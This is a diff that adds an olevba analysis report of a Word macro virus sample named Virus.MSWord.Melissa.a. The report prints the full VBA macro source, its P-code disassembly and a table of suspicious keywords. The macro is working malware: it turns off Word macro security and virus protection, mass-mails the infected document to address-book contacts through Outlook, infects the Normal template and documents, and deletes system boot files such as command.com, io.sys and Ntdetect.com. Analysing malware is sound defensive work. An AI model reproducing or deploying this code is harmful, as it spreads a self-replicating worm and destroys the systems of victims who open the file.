@@ -1,0 +1,733 @@
+olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
+===============================================================================
+FILE: ./Virus.MSWord.Melissa.a
+Type: OLE
+-------------------------------------------------------------------------------
+VBA MACRO Mmmmmmm.cls 
+in file: ./Virus.MSWord.Melissa.a - OLE stream: 'Macros/VBA/Mmmmmmm'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Private Sub Document_Close()
+Selection.TypeText "Loading... No"
+On Error Resume Next
+If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
+CommandBars("Macro").Controls("Security...").Enabled = False
+System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
+Else
+CommandBars("Tools").Controls("Macro").Enabled = False
+Options.ConfirmConversions = (1 - 1): Options.VirusProtection = (1 - 1): Options.SaveNormalPrompt = (1 - 1)
+End If
+Dim UngaDasOutlook, DasMapiName, BreakUmOffASlice
+Set UngaDasOutlook = CreateObject("Outlook.Application")
+Set DasMapiName = UngaDasOutlook.GetNameSpace("MAPI")
+If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "Mmmmmmm?") <> "... by 000003" Then
+If UngaDasOutlook = "Outlook" Then
+DasMapiName.Logon "profile", "password"
+    For y = 1 To DasMapiName.AddressLists.Count
+        Set AddyBook = DasMapiName.AddressLists(y)
+        x = 1
+        Set BreakUmOffASlice = UngaDasOutlook.CreateItem(0)
+        For oo = 1 To AddyBook.AddressEntries.Count
+            Peep = AddyBook.AddressEntries(x)
+            BreakUmOffASlice.Recipients.Add Peep
+            x = x + 1
+            If x > 4 Then oo = AddyBook.AddressEntries.Count
+         Next oo
+         BreakUmOffASlice.Subject = "pictures " & Application.UserName
+         BreakUmOffASlice.Body = "what's up ?"
+         BreakUmOffASlice.Attachments.Add ActiveDocument.FullName
+         BreakUmOffASlice.Send
+         Peep = ""
+    Next y
+DasMapiName.Logoff
+End If
+System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "Mmmmmmm?") = "... by 000003"
+End If
+Set ADI1 = ActiveDocument.VBProject.VBComponents.Item(1)
+Set NTI1 = NormalTemplate.VBProject.VBComponents.Item(1)
+NTCL = NTI1.CodeModule.CountOfLines
+ADCL = ADI1.CodeModule.CountOfLines
+BGN = 2
+If ADI1.Name <> "Mmmmmmm" Then
+If ADCL > 0 Then _
+ADI1.CodeModule.DeleteLines 1, ADCL
+Set ToInfect = ADI1
+ADI1.Name = "Mmmmmmm"
+DoAD = True
+End If
+If NTI1.Name <> "Mmmmmmm" Then
+If NTCL > 0 Then _
+NTI1.CodeModule.DeleteLines 1, NTCL
+Set ToInfect = NTI1
+NTI1.Name = "Mmmmmmm"
+DoNT = True
+End If
+If DoNT <> True And DoAD <> True Then GoTo CYA
+If DoNT = True Then
+Do While ADI1.CodeModule.Lines(1, 1) = ""
+ADI1.CodeModule.DeleteLines 1
+Loop
+ToInfect.CodeModule.AddFromString ("Private Sub Document_Close()")
+Do While ADI1.CodeModule.Lines(BGN, 1) <> ""
+ToInfect.CodeModule.InsertLines BGN, ADI1.CodeModule.Lines(BGN, 1)
+BGN = BGN + 1
+Loop
+End If
+If DoAD = True Then
+Do While NTI1.CodeModule.Lines(1, 1) = ""
+NTI1.CodeModule.DeleteLines 1
+Loop
+ToInfect.CodeModule.AddFromString ("Private Sub Document_Open()")
+Do While NTI1.CodeModule.Lines(BGN, 1) <> ""
+ToInfect.CodeModule.InsertLines BGN, NTI1.CodeModule.Lines(BGN, 1)
+BGN = BGN + 1
+Loop
+End If
+CYA:
+If NTCL <> 0 And ADCL = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then
+ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
+ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
+ActiveDocument.Saved = True: End If
+'Mmmmmmm Good by: phr0zen
+If Day(Now) = Minute(Now) Then Selection.TypeText ""
+On Error Resume Next
+Kill "c:\command.com"
+On Error Resume Next
+Shell "attrib c:\io.sys -r,-h,-s,-a", vbHide
+On Error Resume Next
+Kill "c:\io.sys"
+On Error Resume Next
+Kill "d:\command.com"
+On Error Resume Next
+Shell "attrib c:\io.sys -r,-h,-s,-a", vbHide
+On Error Resume Next
+Kill "d:\io.sys"
+On Error Resume Next
+Shell "attrib c:\Ntdetect.com -r,-h,-s,-a", vbHide
+On Error Resume Next
+Kill "c:\Ntdetect.com"
+On Error Resume Next
+Shell "attrib c:\Suhdlog.dat -r,-h,-s,-a", vbHide
+On Error Resume Next
+Kill "c:\Suhdlog.dat"
+On Error Resume Next
+Shell "attrib d:\Ntdetect.com -r,-h,-s,-a", vbHide
+On Error Resume Next
+Kill "c:\Ntdetect.com"
+On Error Resume Next
+Shell "attrib d:\Suhdlog.dat -r,-h,-s,-a", vbHide
+On Error Resume Next
+Kill "d:\Suhdlog.dat"
+On Error Resume Next
+Beep
+Beep
+Selection.TypeText ">>>>>Please Check Outlook Inbox Mail<<<<<"
+End Sub
+
+-------------------------------------------------------------------------------
+VBA MACRO VBA_P-code.txt 
+in file: VBA P-code - OLE stream: 'VBA P-code'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+' Processing file: ./Virus.MSWord.Melissa.a
+' ===============================================================================
+' Module streams:
+' Macros/VBA/Mmmmmmm - 7358 bytes
+' Line #0:
+' 	FuncDefn (Private Sub Document_Close())
+' Line #1:
+' 	LitStr 0x000D "Loading... No"
+' 	Ld Selection 
+' 	ArgsMemCall TypeText 0x0001 
+' Line #2:
+' 	OnError (Resume Next) 
+' Line #3:
+' 	LitStr 0x0000 ""
+' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
+' 	LitStr 0x0005 "Level"
+' 	Ld System 
+' 	ArgsMemLd PrivateProfileString 0x0003 
+' 	LitStr 0x0000 ""
+' 	Ne 
+' 	IfBlock 
+' Line #4:
+' 	LitVarSpecial (False)
+' 	LitStr 0x000B "Security..."
+' 	LitStr 0x0005 "Macro"
+' 	ArgsLd CommandBars 0x0001 
+' 	ArgsMemLd Controls 0x0001 
+' 	MemSt Enabled 
+' Line #5:
+' 	LitDI4 0x0001 0x0000 
+' 	LitStr 0x0000 ""
+' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
+' 	LitStr 0x0005 "Level"
+' 	Ld System 
+' 	ArgsMemSt PrivateProfileString 0x0003 
+' Line #6:
+' 	ElseBlock 
+' Line #7:
+' 	LitVarSpecial (False)
+' 	LitStr 0x0005 "Macro"
+' 	LitStr 0x0005 "Tools"
+' 	ArgsLd CommandBars 0x0001 
+' 	ArgsMemLd Controls 0x0001 
+' 	MemSt Enabled 
+' Line #8:
+' 	LitDI2 0x0001 
+' 	LitDI2 0x0001 
+' 	Sub 
+' 	Paren 
+' 	Ld Options 
+' 	MemSt ConfirmConversions 
+' 	BoS 0x0000 
+' 	LitDI2 0x0001 
+' 	LitDI2 0x0001 
+' 	Sub 
+' 	Paren 
+' 	Ld Options 
+' 	MemSt VirusProtection 
+' 	BoS 0x0000 
+' 	LitDI2 0x0001 
+' 	LitDI2 0x0001 
+' 	Sub 
+' 	Paren 
+' 	Ld Options 
+' 	MemSt SaveNormalPrompt 
+' Line #9:
+' 	EndIfBlock 
+' Line #10:
+' 	Dim 
+' 	VarDefn UngaDasOutlook
+' 	VarDefn DasMapiName
+' 	VarDefn BreakUmOffASlice
+' Line #11:
+' 	SetStmt 
+' 	LitStr 0x0013 "Outlook.Application"
+' 	ArgsLd CreateObject 0x0001 
+' 	Set UngaDasOutlook 
+' Line #12:
+' 	SetStmt 
+' 	LitStr 0x0004 "MAPI"
+' 	Ld UngaDasOutlook 
+' 	ArgsMemLd GetNameSpace 0x0001 
+' 	Set DasMapiName 
+' Line #13:
+' 	LitStr 0x0000 ""
+' 	LitStr 0x002C "HKEY_CURRENT_USER\Software\Microsoft\Office\"
+' 	LitStr 0x0008 "Mmmmmmm?"
+' 	Ld System 
+' 	ArgsMemLd PrivateProfileString 0x0003 
+' 	LitStr 0x000D "... by 000003"
+' 	Ne 
+' 	IfBlock 
+' Line #14:
+' 	Ld UngaDasOutlook 
+' 	LitStr 0x0007 "Outlook"
+' 	Eq 
+' 	IfBlock 
+' Line #15:
+' 	LitStr 0x0007 "profile"
+' 	LitStr 0x0008 "password"
+' 	Ld DasMapiName 
+' 	ArgsMemCall Logon 0x0002 
+' Line #16:
+' 	StartForVariable 
+' 	Ld y 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	Ld DasMapiName 
+' 	MemLd AddressLists 
+' 	MemLd Count 
+' 	For 
+' Line #17:
+' 	SetStmt 
+' 	Ld y 
+' 	Ld DasMapiName 
+' 	ArgsMemLd AddressLists 0x0001 
+' 	Set AddyBook 
+' Line #18:
+' 	LitDI2 0x0001 
+' 	St x 
+' Line #19:
+' 	SetStmt 
+' 	LitDI2 0x0000 
+' 	Ld UngaDasOutlook 
+' 	ArgsMemLd CreateItem 0x0001 
+' 	Set BreakUmOffASlice 
+' Line #20:
+' 	StartForVariable 
+' 	Ld oo 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	Ld AddyBook 
+' 	MemLd AddressEntries 
+' 	MemLd Count 
+' 	For 
+' Line #21:
+' 	Ld x 
+' 	Ld AddyBook 
+' 	ArgsMemLd AddressEntries 0x0001 
+' 	St Peep 
+' Line #22:
+' 	Ld Peep 
+' 	Ld BreakUmOffASlice 
+' 	MemLd Recipients 
+' 	ArgsMemCall Add 0x0001 
+' Line #23:
+' 	Ld x 
+' 	LitDI2 0x0001 
+' 	Add 
+' 	St x 
+' Line #24:
+' 	Ld x 
+' 	LitDI2 0x0004 
+' 	Gt 
+' 	If 
+' 	BoSImplicit 
+' 	Ld AddyBook 
+' 	MemLd AddressEntries 
+' 	MemLd Count 
+' 	St oo 
+' 	EndIf 
+' Line #25:
+' 	StartForVariable 
+' 	Ld oo 
+' 	EndForVariable 
+' 	NextVar 
+' Line #26:
+' 	LitStr 0x0009 "pictures "
+' 	Ld Application 
+' 	MemLd UserName 
+' 	Concat 
+' 	Ld BreakUmOffASlice 
+' 	MemSt Subject 
+' Line #27:
+' 	LitStr 0x000B "what's up ?"
+' 	Ld BreakUmOffASlice 
+' 	MemSt Body 
+' Line #28:
+' 	Ld ActiveDocument 
+' 	MemLd FullName 
+' 	Ld BreakUmOffASlice 
+' 	MemLd Attachments 
+' 	ArgsMemCall Add 0x0001 
+' Line #29:
+' 	Ld BreakUmOffASlice 
+' 	ArgsMemCall Send 0x0000 
+' Line #30:
+' 	LitStr 0x0000 ""
+' 	St Peep 
+' Line #31:
+' 	StartForVariable 
+' 	Ld y 
+' 	EndForVariable 
+' 	NextVar 
+' Line #32:
+' 	Ld DasMapiName 
+' 	ArgsMemCall Logoff 0x0000 
+' Line #33:
+' 	EndIfBlock 
+' Line #34:
+' 	LitStr 0x000D "... by 000003"
+' 	LitStr 0x0000 ""
+' 	LitStr 0x002C "HKEY_CURRENT_USER\Software\Microsoft\Office\"
+' 	LitStr 0x0008 "Mmmmmmm?"
+' 	Ld System 
+' 	ArgsMemSt PrivateProfileString 0x0003 
+' Line #35:
+' 	EndIfBlock 
+' Line #36:
+' 	SetStmt 
+' 	LitDI2 0x0001 
+' 	Ld ActiveDocument 
+' 	MemLd VBProject 
+' 	MemLd VBComponents 
+' 	ArgsMemLd Item 0x0001 
+' 	Set ADI1 
+' Line #37:
+' 	SetStmt 
+' 	LitDI2 0x0001 
+' 	Ld NormalTemplate 
+' 	MemLd VBProject 
+' 	MemLd VBComponents 
+' 	ArgsMemLd Item 0x0001 
+' 	Set NTI1 
+' Line #38:
+' 	Ld NTI1 
+' 	MemLd CodeModule 
+' 	MemLd CountOfLines 
+' 	St NTCL 
+' Line #39:
+' 	Ld ADI1 
+' 	MemLd CodeModule 
+' 	MemLd CountOfLines 
+' 	St ADCL 
+' Line #40:
+' 	LitDI2 0x0002 
+' 	St BGN 
+' Line #41:
+' 	Ld ADI1 
+' 	MemLd New 
+' 	LitStr 0x0007 "Mmmmmmm"
+' 	Ne 
+' 	IfBlock 
+' Line #42:
+' 	LineCont 0x0004 05 00 00 00
+' 	Ld ADCL 
+' 	LitDI2 0x0000 
+' 	Gt 
+' 	If 
+' 	BoSImplicit 
+' 	LitDI2 0x0001 
+' 	Ld ADCL 
+' 	Ld ADI1 
+' 	MemLd CodeModule 
+' 	ArgsMemCall DeleteLines 0x0002 
+' 	EndIf 
+' Line #43:
+' 	SetStmt 
+' 	Ld ADI1 
+' 	Set ToInfect 
+' Line #44:
+' 	LitStr 0x0007 "Mmmmmmm"
+' 	Ld ADI1 
+' 	MemSt New 
+' Line #45:
+' 	LitVarSpecial (True)
+' 	St DoAD 
+' Line #46:
+' 	EndIfBlock 
+' Line #47:
+' 	Ld NTI1 
+' 	MemLd New 
+' 	LitStr 0x0007 "Mmmmmmm"
+' 	Ne 
+' 	IfBlock 
+' Line #48:
+' 	LineCont 0x0004 05 00 00 00
+' 	Ld NTCL 
+' 	LitDI2 0x0000 
+' 	Gt 
+' 	If 
+' 	BoSImplicit 
+' 	LitDI2 0x0001 
+' 	Ld NTCL 
+' 	Ld NTI1 
+' 	MemLd CodeModule 
+' 	ArgsMemCall DeleteLines 0x0002 
+' 	EndIf 
+' Line #49:
+' 	SetStmt 
+' 	Ld NTI1 
+' 	Set ToInfect 
+' Line #50:
+' 	LitStr 0x0007 "Mmmmmmm"
+' 	Ld NTI1 
+' 	MemSt New 
+' Line #51:
+' 	LitVarSpecial (True)
+' 	St DoNT 
+' Line #52:
+' 	EndIfBlock 
+' Line #53:
+' 	Ld DoNT 
+' 	LitVarSpecial (True)
+' 	Ne 
+' 	Ld DoAD 
+' 	LitVarSpecial (True)
+' 	Ne 
+' 	And 
+' 	If 
+' 	BoSImplicit 
+' 	GoTo CYA 
+' 	EndIf 
+' Line #54:
+' 	Ld DoNT 
+' 	LitVarSpecial (True)
+' 	Eq 
+' 	IfBlock 
+' Line #55:
+' 	LitDI2 0x0001 
+' 	LitDI2 0x0001 
+' 	Ld ADI1 
+' 	MemLd CodeModule 
+' 	ArgsMemLd Lines 0x0002 
+' 	LitStr 0x0000 ""
+' 	Eq 
+' 	DoWhile 
+' Line #56:
+' 	LitDI2 0x0001 
+' 	Ld ADI1 
+' 	MemLd CodeModule 
+' 	ArgsMemCall DeleteLines 0x0001 
+' Line #57:
+' 	Loop 
+' Line #58:
+' 	LitStr 0x001C "Private Sub Document_Close()"
+' 	Paren 
+' 	Ld ToInfect 
+' 	MemLd CodeModule 
+' 	ArgsMemCall AddFromString 0x0001 
+' Line #59:
+' 	Ld BGN 
+' 	LitDI2 0x0001 
+' 	Ld ADI1 
+' 	MemLd CodeModule 
+' 	ArgsMemLd Lines 0x0002 
+' 	LitStr 0x0000 ""
+' 	Ne 
+' 	DoWhile 
+' Line #60:
+' 	Ld BGN 
+' 	Ld BGN 
+' 	LitDI2 0x0001 
+' 	Ld ADI1 
+' 	MemLd CodeModule 
+' 	ArgsMemLd Lines 0x0002 
+' 	Ld ToInfect 
+' 	MemLd CodeModule 
+' 	ArgsMemCall InsertLines 0x0002 
+' Line #61:
+' 	Ld BGN 
+' 	LitDI2 0x0001 
+' 	Add 
+' 	St BGN 
+' Line #62:
+' 	Loop 
+' Line #63:
+' 	EndIfBlock 
+' Line #64:
+' 	Ld DoAD 
+' 	LitVarSpecial (True)
+' 	Eq 
+' 	IfBlock 
+' Line #65:
+' 	LitDI2 0x0001 
+' 	LitDI2 0x0001 
+' 	Ld NTI1 
+' 	MemLd CodeModule 
+' 	ArgsMemLd Lines 0x0002 
+' 	LitStr 0x0000 ""
+' 	Eq 
+' 	DoWhile 
+' Line #66:
+' 	LitDI2 0x0001 
+' 	Ld NTI1 
+' 	MemLd CodeModule 
+' 	ArgsMemCall DeleteLines 0x0001 
+' Line #67:
+' 	Loop 
+' Line #68:
+' 	LitStr 0x001B "Private Sub Document_Open()"
+' 	Paren 
+' 	Ld ToInfect 
+' 	MemLd CodeModule 
+' 	ArgsMemCall AddFromString 0x0001 
+' Line #69:
+' 	Ld BGN 
+' 	LitDI2 0x0001 
+' 	Ld NTI1 
+' 	MemLd CodeModule 
+' 	ArgsMemLd Lines 0x0002 
+' 	LitStr 0x0000 ""
+' 	Ne 
+' 	DoWhile 
+' Line #70:
+' 	Ld BGN 
+' 	Ld BGN 
+' 	LitDI2 0x0001 
+' 	Ld NTI1 
+' 	MemLd CodeModule 
+' 	ArgsMemLd Lines 0x0002 
+' 	Ld ToInfect 
+' 	MemLd CodeModule 
+' 	ArgsMemCall InsertLines 0x0002 
+' Line #71:
+' 	Ld BGN 
+' 	LitDI2 0x0001 
+' 	Add 
+' 	St BGN 
+' Line #72:
+' 	Loop 
+' Line #73:
+' 	EndIfBlock 
+' Line #74:
+' 	Label CYA 
+' Line #75:
+' 	Ld NTCL 
+' 	LitDI2 0x0000 
+' 	Ne 
+' 	Ld ADCL 
+' 	LitDI2 0x0000 
+' 	Eq 
+' 	And 
+' 	LitDI2 0x0001 
+' 	Ld ActiveDocument 
+' 	MemLd New 
+' 	LitStr 0x0008 "Document"
+' 	FnInStr3 
+' 	LitVarSpecial (False)
+' 	Eq 
+' 	Paren 
+' 	And 
+' 	IfBlock 
+' Line #76:
+' 	Ld ActiveDocument 
+' 	MemLd FullName 
+' 	ParamNamed FileName 
+' 	Ld ActiveDocument 
+' 	ArgsMemCall SaveAs 0x0001 
+' Line #77:
+' 	LitDI2 0x0001 
+' 	Ld ActiveDocument 
+' 	MemLd New 
+' 	LitStr 0x0008 "Document"
+' 	FnInStr3 
+' 	LitVarSpecial (False)
+' 	Ne 
+' 	Paren 
+' 	ElseIfBlock 
+' Line #78:
+' 	LitVarSpecial (True)
+' 	Ld ActiveDocument 
+' 	MemSt Saved 
+' 	BoS 0x0000 
+' 	EndIfBlock 
+' Line #79:
+' 	QuoteRem 0x0000 0x0018 "Mmmmmmm Good by: phr0zen"
+' Line #80:
+' 	Ld Now 
+' 	ArgsLd Day 0x0001 
+' 	Ld Now 
+' 	ArgsLd Minute 0x0001 
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	LitStr 0x0000 ""
+' 	Ld Selection 
+' 	ArgsMemCall TypeText 0x0001 
+' 	EndIf 
+' Line #81:
+' 	OnError (Resume Next) 
+' Line #82:
+' 	LitStr 0x000E "c:\command.com"
+' 	ArgsCall Kill 0x0001 
+' Line #83:
+' 	OnError (Resume Next) 
+' Line #84:
+' 	LitStr 0x001C "attrib c:\io.sys -r,-h,-s,-a"
+' 	Ld vbHide 
+' 	ArgsCall Shell 0x0002 
+' Line #85:
+' 	OnError (Resume Next) 
+' Line #86:
+' 	LitStr 0x0009 "c:\io.sys"
+' 	ArgsCall Kill 0x0001 
+' Line #87:
+' 	OnError (Resume Next) 
+' Line #88:
+' 	LitStr 0x000E "d:\command.com"
+' 	ArgsCall Kill 0x0001 
+' Line #89:
+' 	OnError (Resume Next) 
+' Line #90:
+' 	LitStr 0x001C "attrib c:\io.sys -r,-h,-s,-a"
+' 	Ld vbHide 
+' 	ArgsCall Shell 0x0002 
+' Line #91:
+' 	OnError (Resume Next) 
+' Line #92:
+' 	LitStr 0x0009 "d:\io.sys"
+' 	ArgsCall Kill 0x0001 
+' Line #93:
+' 	OnError (Resume Next) 
+' Line #94:
+' 	LitStr 0x0022 "attrib c:\Ntdetect.com -r,-h,-s,-a"
+' 	Ld vbHide 
+' 	ArgsCall Shell 0x0002 
+' Line #95:
+' 	OnError (Resume Next) 
+' Line #96:
+' 	LitStr 0x000F "c:\Ntdetect.com"
+' 	ArgsCall Kill 0x0001 
+' Line #97:
+' 	OnError (Resume Next) 
+' Line #98:
+' 	LitStr 0x0021 "attrib c:\Suhdlog.dat -r,-h,-s,-a"
+' 	Ld vbHide 
+' 	ArgsCall Shell 0x0002 
+' Line #99:
+' 	OnError (Resume Next) 
+' Line #100:
+' 	LitStr 0x000E "c:\Suhdlog.dat"
+' 	ArgsCall Kill 0x0001 
+' Line #101:
+' 	OnError (Resume Next) 
+' Line #102:
+' 	LitStr 0x0022 "attrib d:\Ntdetect.com -r,-h,-s,-a"
+' 	Ld vbHide 
+' 	ArgsCall Shell 0x0002 
+' Line #103:
+' 	OnError (Resume Next) 
+' Line #104:
+' 	LitStr 0x000F "c:\Ntdetect.com"
+' 	ArgsCall Kill 0x0001 
+' Line #105:
+' 	OnError (Resume Next) 
+' Line #106:
+' 	LitStr 0x0021 "attrib d:\Suhdlog.dat -r,-h,-s,-a"
+' 	Ld vbHide 
+' 	ArgsCall Shell 0x0002 
+' Line #107:
+' 	OnError (Resume Next) 
+' Line #108:
+' 	LitStr 0x000E "d:\Suhdlog.dat"
+' 	ArgsCall Kill 0x0001 
+' Line #109:
+' 	OnError (Resume Next) 
+' Line #110:
+' 	ArgsCall Beep 0x0000 
+' Line #111:
+' 	ArgsCall Beep 0x0000 
+' Line #112:
+' 	LitStr 0x0029 ">>>>>Please Check Outlook Inbox Mail<<<<<"
+' 	Ld Selection 
+' 	ArgsMemCall TypeText 0x0001 
+' Line #113:
+' 	EndSub 
+' Line #114:
++----------+--------------------+---------------------------------------------+
+|Type      |Keyword             |Description                                  |
++----------+--------------------+---------------------------------------------+
+|AutoExec  |Document_Close      |Runs when the Word document is closed        |
+|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
+|          |                    |opened                                       |
+|Suspicious|Kill                |May delete a file                            |
+|Suspicious|Shell               |May run an executable file or a system       |
+|          |                    |command                                      |
+|Suspicious|vbHide              |May run an executable file or a system       |
+|          |                    |command                                      |
+|Suspicious|command             |May run PowerShell commands                  |
+|Suspicious|CreateObject        |May create an OLE object                     |
+|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
+|          |                    |modification)                                |
+|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
+|          |                    |modification)                                |
+|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
+|          |                    |modification)                                |
+|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
+|          |                    |modification)                                |
+|Suspicious|System              |May run an executable file or a system       |
+|          |                    |command on a Mac (if combined with           |
+|          |                    |libc.dylib)                                  |
+|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
+|          |                    |used to obfuscate strings (option --decode to|
+|          |                    |see all)                                     |
+|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
+|          |                    |used to obfuscate strings (option --decode to|
+|          |                    |see all)                                     |
+|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
+|          |                    |code and P-code are different, this may have |
+|          |                    |been used to hide malicious code             |
++----------+--------------------+---------------------------------------------+
+VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues
+
